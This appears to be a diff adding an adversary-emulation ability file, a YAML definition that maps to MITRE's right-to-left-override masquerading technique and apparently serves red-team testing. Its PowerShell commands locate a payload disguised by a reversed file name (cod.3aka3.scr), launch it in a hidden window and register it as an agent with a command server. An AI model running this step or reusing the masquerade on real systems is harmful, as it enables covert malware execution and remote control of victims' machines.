@@ -1,0 +1,53 @@
+ability_id: 571845f6-b75c-4b9d-a666-a78f7827261f
+access: {}
+additional_info: {}
+buckets:
+- execution
+delete_payload: true
+description: Perform RTLO technique with SANDCAT
+executors:
+- additional_info: {}
+  build_target: null
+  cleanup: []
+  code: null
+  command: "Sleep 3;\n$bin = Get-ChildItem *cod*scr*;\n$arguments = '-server \"#{server}\"\
+    \ -group \"rtlo_group\"';\nstart-process -WindowStyle Hidden $bin.FullName.toString()\
+    \ -ArgumentList $arguments;\n\nif ($?) {\n  write-host \"Successfully completed\
+    \ RTLO execution. A new agent should appear\";\n  exit 0;\n\n} else {\n  write-host\
+    \ \"Failure of RTLO execution.\";\n  exit 1;\n}"
+  language: null
+  name: psh
+  parsers: []
+  payloads:
+  - cod.3aka3.scr
+  platform: windows
+  timeout: 60
+  uploads: []
+  variations: []
+- additional_info: {}
+  build_target: null
+  cleanup: []
+  code: null
+  command: "Sleep 3;\n$bin = Get-ChildItem *cod*scr*;\n$arguments = '-server \"#{server}\"\
+    \ -group \"rtlo_group\"';\nstart-process -WindowStyle Hidden $bin.FullName.toString()\
+    \ -ArgumentList $arguments;\n\nif ($?) {\n  write-host \"Successfully completed\
+    \ RTLO execution. A new agent should appear\";\n  exit 0;\n\n} else {\n  write-host\
+    \ \"Failure of RTLO execution.\";\n  exit 1;\n}"
+  language: null
+  name: pwsh
+  parsers: []
+  payloads:
+  - cod.3aka3.scr
+  platform: windows
+  timeout: 60
+  uploads: []
+  variations: []
+name: RTLO Start Sandcat
+plugin: emu
+privilege: ''
+repeatable: false
+requirements: []
+singleton: false
+tactic: execution
+technique_id: T1036.002
+technique_name: 'Masquerading: Right-to-Left Override'
